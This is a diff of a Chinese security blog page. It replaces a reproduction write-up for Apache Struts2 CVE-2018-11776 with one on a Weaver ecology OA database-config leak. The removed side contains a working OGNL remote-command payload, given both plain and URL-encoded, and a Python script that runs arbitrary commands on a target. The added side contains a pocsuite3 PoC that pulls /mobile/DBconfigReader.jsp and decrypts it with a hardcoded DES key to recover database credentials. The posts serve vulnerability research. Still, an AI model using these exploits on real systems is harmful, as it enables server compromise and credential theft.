@@ -4,8 +4,9 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="CVE-2018-11776漏洞复现, dylan&#39;s blog">
-    <meta name="description" content="0x01 漏洞概述2018年8月23日，ApacheStrust2发布最新安全公告，ApacheStruts2 存在远程代码执行的高危漏洞，该漏洞由SemmleSecurity Researchteam的安全研究员汇报，漏洞编号为CVE-2">
+    <meta name="keywords" content="泛微ecology OA数据库配置信息泄露漏洞复现, dylan&#39;s blog">
+    <meta name="description" content="0x00 漏洞概述泛微ecology OA系统接口存在数据库配置信息泄露漏洞,攻击者可通过该漏洞页面直接获取到数据库配置信息，攻击者可通过访问存在漏洞的页面并解密从而获取数据库配置信息
+0x01 影响版本漏洞涉及范围包括不限于8.0、9.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +14,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>CVE-2018-11776漏洞复现 | dylan&#39;s blog</title>
+    <title>泛微ecology OA数据库配置信息泄露漏洞复现 | dylan&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -273,13 +274,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        CVE-2018-11776漏洞复现
+                        泛微ecology OA数据库配置信息泄露漏洞复现
                     </div>
                 </div>
             </div>
@@ -394,12 +395,12 @@
                                 <span class="chip bg-color">漏洞复现</span>
                             </a>
                         
-                            <a href="/tags/CVE-2018-11776/" target="_blank">
-                                <span class="chip bg-color">CVE-2018-11776</span>
+                            <a href="/tags/泛微e-cology-OA/" target="_blank">
+                                <span class="chip bg-color">泛微e-cology OA</span>
                             </a>
                         
-                            <a href="/tags/struts2/" target="_blank">
-                                <span class="chip bg-color">struts2</span>
+                            <a href="/tags/info-disclosure/" target="_blank">
+                                <span class="chip bg-color">info_disclosure</span>
                             </a>
                         
                     </div>
@@ -422,21 +423,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-08-02
+                    2019-10-28
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.9k
+                        710
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        10 分
+                        3 分
                     </div>
                     
                 
@@ -452,103 +453,84 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>2018年8月23日，ApacheStrust2发布最新安全公告，ApacheStruts2 存在远程代码执行的高危漏洞，该漏洞由SemmleSecurity Researchteam的安全研究员汇报，漏洞编号为CVE-2018-11776（S2-057）。</p>
-<p>定义XML配置时如果namespace值未设置且上层动作配置（Action Configuration）中未设置或用通配符namespace时可能会导致远程代码执行。<br>URL标签未设置value和action值且上层动作未设置或用通配符namespace时可能会导致远程代码执行，以及系统命令到服务器系统中去 。</p>
-<hr>
-<h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>Apache struts 2.3-Apache struts 2.3.34</p>
-<p>Apache struts 2.5-Apache struts 2.5.16 </p>
-<hr>
-<h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul>
-<li>windows 10</li>
-<li>jdk1.8.0_191</li>
-<li>apache-tomcat-7.0.96</li>
-<li>struts-2.3.34</li>
-</ul>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先安装jdk，并配置环境变量，不再赘述</p>
-<p>下载 <a href="https://tomcat.apache.org/download-70.cgi" target="_blank" rel="noopener">apache-tomcat</a> 并解压<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802122817.png" alt></p>
-<p>下载 <a href="http://archive.apache.org/dist/struts/2.3.34/" target="_blank" rel="noopener">Struts-2.3.34</a> 解压，并将apps目录下的 <code>struts2-showcase.war</code> 复制到tomcat的webapps目录下<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123100.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123449.png" alt></p>
-<p>在tomcat下bin目录下运行startup.bat脚本来启动tomcat，启动后自动部署struts2<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123719.png" alt></p>
-<p>浏览器访问 <code>http://127.0.0.1:8080/struts2-showcase</code>，出现如下界面即为部署成功了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123957.png" alt></p>
-<p>正常部署完成struts如上所示，但为了复现struts2-057漏洞，需要修改如下两个文件（tomcat目录下）</p>
-<ul>
-<li>D:\Program Files\Java\apache-tomcat-7.0.96\webapps\struts2-showcase\WEB-INF\src\java\struts-actionchaining.xml</li>
-<li>D:\Program Files\Java\apache-tomcat-7.0.96\webapps\struts2-showcase\WEB-INF\classes\struts-actionchaining.xml</li>
-</ul>
-<p>注释掉原来的xml代码，修改如下<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802124843.png" alt></p>
-<pre><code>&lt;struts&gt;
-    &lt;package name=&quot;actionchaining&quot; extends=&quot;struts-default&quot;&gt;
-        &lt;action name=&quot;actionChain1&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt;
-            &lt;result type=&quot;redirectAction&quot;&gt;
-            &lt;param name = &quot;actionName&quot;&gt;register2&lt;/param&gt;
-            &lt;/result&gt;    
-        &lt;/action&gt;
-        &lt;action name=&quot;actionChain2&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain2&quot;&gt;
-            &lt;result type=&quot;chain&quot;&gt;actionChain3&lt;/result&gt;
-        &lt;/action&gt;
-        &lt;action name=&quot;actionChain3&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain3&quot;&gt;
-            &lt;result&gt;/WEB-INF/actionchaining/actionChainingResult.jsp&lt;/result&gt;
-        &lt;/action&gt;
-    &lt;/package&gt;
-&lt;/struts&gt;</code></pre><p>在tomcat下bin目录下运行shutdown.bat，startup.bat脚本来重启tomcat。<br><strong>重启tomcat！！！</strong><br><strong>重启tomcat！！！</strong><br><strong>重启tomcat！！！</strong><br>浏览器访问<code>http://192.168.10.230:8080/struts2-showcase/</code>,漏洞环境成功搭建</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在URL构造ognl表达式，再加上配置文件中的action标签中的name属性值，并以.action结尾<br><code>http://127.0.0.1:8080/struts2-showcase/${(50+50)}/actionChain1.action</code><br>执行完成之后发现跳转到了<br><code>http://127.0.0.1:8080/struts2-showcase/100/register2.action</code><br>执行了ognl 表达式 ${(50+50)},漏洞存在</p>
-<p>进一步利用漏洞，弹出计算器，构造payload</p>
-<pre><code>${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;))}</code></pre><p>进行URL编码 </p>
-<pre><code>%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d</code></pre><p>拼接</p>
-<pre><code>127.0.0.1:8080/struts2-showcase/%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d/actionChain1.action</code></pre><p>成功执行<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802131043.png" alt></p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>#coding: utf-8
-#! python2
-import requests
-import sys
+                <h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><p>泛微ecology OA系统接口存在数据库配置信息泄露漏洞,<br>攻击者可通过该漏洞页面直接获取到数据库配置信息，<br>攻击者可通过访问存在漏洞的页面并解密从而获取数据库配置信息</p>
+<h1 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h1><p><strong>漏洞涉及范围包括不限于8.0、9.0版</strong></p>
+<h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>附上 <strong>ecology8.1安装包+安装教程</strong><br>百度链接：<a href="https://pan.baidu.com/s/1ciU0clOlqV3iDqQ6Ic2RAA" target="_blank" rel="noopener">https://pan.baidu.com/s/1ciU0clOlqV3iDqQ6Ic2RAA</a><br>提取码: 3xh9 </p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接访问存在漏洞路径，<br>结果为为DES加密以后的乱码</p>
+<p><code>url+/mobile/DBconfigReader.jsp</code></p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104142320.png" alt></p>
+<p>查看返回的数据，发现存在一些\r\n，需要去掉\r\n，<br>可以选择切片取出数据，也可以使用repalce替换<br>再使用DES算法结合密钥进行解密之后，<br>即可获得数据库相关信息，密钥为<code>1z2x3c4v</code></p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104142755.png" alt></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>#! python3
+&quot;&quot;&quot;
+
+@FileName: e_cology_oa_info_disclosure.py.py
+@Author: dylan
+@software: PyCharm 
+@Datetime: 2019-10-28 10:30
+
+&quot;&quot;&quot;
+import base64
+import urllib.parse
+from pocsuite3.api import Output, POCBase, register_poc, requests, logger
+from pyDes import *
 
 
-def expliot(host, command, path):
-    &#39;&#39;&#39;
-    2.3.34版本
-    payload1:
-    ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())}
-    2.3.20版本
-    payload2:
-    ${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())}
-    &#39;&#39;&#39;
+class DemoPOC(POCBase):
+    vulID = &quot;&quot;  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
+    version = &quot;3.0&quot;  # 默认为1
+    author = &quot;dylan&quot;  # PoC作者的大名
+    vulDate = &quot;2019/10/29&quot;  # 漏洞公开的时间,不知道就写今天
+    createDate = &quot;2019/10/29&quot;  # 编写 PoC 的日期
+    updateDate = &quot;2019/10/29&quot;  # PoC 更新的时间,默认和编写时间一样
+    references = [&quot;&quot;]  # 漏洞地址来源,0day不用写
+    name = &quot;e_cology_oa_info_disclosure&quot;  # PoC 名称
+    appPowerLink = &quot;&quot;  # 漏洞厂商主页地址
+    appName = &quot;e_cology_oa&quot;  # 漏洞应用名称
+    appVersion = &quot;&quot;  # 漏洞影响版本
+    vulType = &quot;info_disclosure&quot;  # 漏洞类型,类型参考见 漏洞类型规范表
+    desc = &quot;&quot;&quot;
 
-    str1 = &quot;${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot; + command + &quot;&#39;).getInputStream()))).(#w.close())}&quot;
-    str1 = str1.encode(&#39;hex&#39;)
-    str2 = &quot;${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot; + command + &quot;&#39;).getInputStream()))).(#w.close())}&quot;
-    str2 = str2.encode(&#39;hex&#39;)
+    &quot;&quot;&quot;  # 漏洞简要描述
+    samples = [&quot;&quot;]  # 测试样列,就是用 PoC 测试成功的网站
+    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+    pocDesc = &quot;&quot;&quot;
 
-    # 需要进行URL编码
-    payload1 = &quot;&quot;
-    for i in range(0, len(str1), 2):
-        payload1 += &#39;%&#39; + str1[i:i + 2]
+    &quot;&quot;&quot;
 
-    payload2 = &quot;&quot;
-    for i in range(0, len(str2), 2):
-        payload2 += &#39;%&#39; + str2[i:i + 2]
-    url1 = host + &#39;/&#39; + payload1 + &#39;/&#39; + path
-    url2 = host + &#39;/&#39; + payload2 + &#39;/&#39; + path
+    def _verify(self):
+        # 验证代码
+        result = {}
+        headers = {
+            &#39;User-Agent&#39;: &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; &quot;
+                          &quot;.NET CLR 2.0.50727)&quot;,
+        }
+        path = self.url + &quot;/mobile/DBconfigReader.jsp&quot;
+        respose = requests.get(path, headers=headers, verify=False, timeout=30).content.replace(b&#39;\r\n&#39;, b&#39;&#39;)
+        # print(respose)
+        respose = str(des(&#39;1z2x3c4v&#39;).decrypt(respose))
+        # print(respose)
+        if &quot;user&quot; in respose:  # result是返回结果
+            result[&#39;VerifyInfo&#39;] = {}
+            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = path
+            result[&#39;DBInfo&#39;] = respose
+        return self.parse_output(result)
 
-    res1 = requests.get(url1, allow_redirects=False)
-    res2 = requests.get(url2, allow_redirects=False)
-    if res1.status_code == 200 and res2.status_code != 200:
-        print(&quot;Exploit successful:&quot;)
-        print(res1.content)
-    elif res2.status_code == 200 and res1.status_code != 200:
-        print(&quot;Exploit successful:&quot;)
-        print(res2.content)
-    else:
-        print(&#39;The target is likely unvulnerable,mabye your struts2 version is too high!&#39;)
+    def _attack(self):
+        # 攻击代码
+        return self._verify()
+
+    def parse_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail(&quot;Internet nothing returned&quot;)
+        return output
 
 
-if __name__ == &#39;__main__&#39;:
-    if len(sys.argv) &lt; 4:
-        print(&quot;Usage: python s2-057-exp.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}&quot;)
-    else:
-        expliot(sys.argv[1].strip(), sys.argv[2], sys.argv[3].strip())</code></pre><p>使用方法：</p>
-<p><code>python2 struts2.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}</code></p>
-<p>例如:<br><code>python2 struts2.py http://192.168.50.197:8080/struts2-showcase/ &quot;ipconfig&quot; actionChain1.action</code></p>
-<hr>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://www.cuittk.cn/2019/01/02/CVE-2018-11776漏洞从搭建到复现/" target="_blank" rel="noopener">CVE-2018-11776漏洞从搭建到复现</a></p>
+# 注册 DemoPOC 类
+register_poc(DemoPOC)</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247483918&idx=1&sn=9319c04f7d7dad68f224b24ceb46e05e" target="_blank" rel="noopener">泛微 e-cology OA 数据库配置信息泄露漏洞复现</a><br><a href="https://github.com/jas502n/DBconfigReader" target="_blank" rel="noopener">DBconfigReader: 泛微ecology OA系统接口存在数据库配置信息泄露漏洞</a></p>
 
             </div>
             <hr/>
@@ -707,9 +689,9 @@ if __name__ == &#39;__main__&#39;:
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《CVE-2018-11776漏洞复现》
+                    《泛微ecology OA数据库配置信息泄露漏洞复现》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/08/02/cve-2018-11776-lou-dong-fu-xian/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/10/28/fan-wei-ecology-oa-shu-ju-ku-pei-zhi-xin-xi-xie-lu-lou-dong-fu-xian/" property="cc:attributionName"
                rel="cc:attributionURL">
                 dylan
             </a> 采用
@@ -1012,33 +994,31 @@ if __name__ == &#39;__main__&#39;:
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/08/04/upload-labs-wen-jian-shang-chuan-lou-dong-lian-xi/">
+                <a href="/2019/10/31/xue-xi-zong-jie-pian-xin-xi-shou-ji/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="upload-labs文件上传漏洞练习">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="学习总结篇——信息收集">
                         
-                        <span class="card-title">upload-labs文件上传漏洞练习</span>
+                        <span class="card-title">学习总结篇——信息收集</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0x01 前言最近在研究文件上传漏洞，找到一个很好的靶场——upload-labs，一个想帮你总结所有类型的上传漏洞的靶场 ，可以用docker快速搭建，闯关的过程中遇到很多问题，受益匪浅。
-
-0x02 环境搭建使用docker快速搭建，d
+                            Being their worst nightmare！
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-04
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-31
                         </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/web安全/" class="post-category" target="_blank">
-                                    web安全
+                            <a href="/categories/summary/" class="post-category" target="_blank">
+                                    summary
                                 </a>
                             
                             
@@ -1048,20 +1028,12 @@ if __name__ == &#39;__main__&#39;:
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/靶场/" target="_blank">
-                        <span class="chip bg-color">靶场</span>
+                    <a href="/tags/信息收集/" target="_blank">
+                        <span class="chip bg-color">信息收集</span>
                     </a>
                     
-                    <a href="/tags/dcoker/" target="_blank">
-                        <span class="chip bg-color">dcoker</span>
-                    </a>
-                    
-                    <a href="/tags/upload-labs/" target="_blank">
-                        <span class="chip bg-color">upload-labs</span>
-                    </a>
-                    
-                    <a href="/tags/文件上传/" target="_blank">
-                        <span class="chip bg-color">文件上传</span>
+                    <a href="/tags/summary/" target="_blank">
+                        <span class="chip bg-color">summary</span>
                     </a>
                     
                 </div>
@@ -1075,25 +1047,26 @@ if __name__ == &#39;__main__&#39;:
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/08/01/ciuiscrm-1.6-eventtype-sql-inj.fu-xian/">
+                <a href="/2019/10/24/thinkcmf-kuang-jia-ren-yi-nei-rong-bao-han-lou-dong-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Ciuis CRM 1.6 - 'eventType' SQL Inj.复现">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="ThinkCMF框架任意内容包含漏洞复现">
                         
-                        <span class="card-title">Ciuis CRM 1.6 - 'eventType' SQL Inj.复现</span>
+                        <span class="card-title">ThinkCMF框架任意内容包含漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0x01 漏洞详情===========================================================================================
-# Exploit Title: Ci
+                            0x00 漏洞概述ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。
+利用此漏洞无需任何权限情况下，构造恶意的url，可以向服务器写入任意内容的文件，实现远程代码执行。
+0x01 影
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-01
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-24
                             </span>
                         <span class="publish-author">
                             
@@ -1114,12 +1087,12 @@ if __name__ == &#39;__main__&#39;:
                         <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
-                    <a href="/tags/Ciuis-CRM-1-6/" target="_blank">
-                        <span class="chip bg-color">Ciuis CRM 1.6</span>
+                    <a href="/tags/ThinkCMF/" target="_blank">
+                        <span class="chip bg-color">ThinkCMF</span>
                     </a>
                     
-                    <a href="/tags/SQL-Inj/" target="_blank">
-                        <span class="chip bg-color">SQL Inj.</span>
+                    <a href="/tags/任意内容包含/" target="_blank">
+                        <span class="chip bg-color">任意内容包含</span>
                     </a>
                     
                 </div>
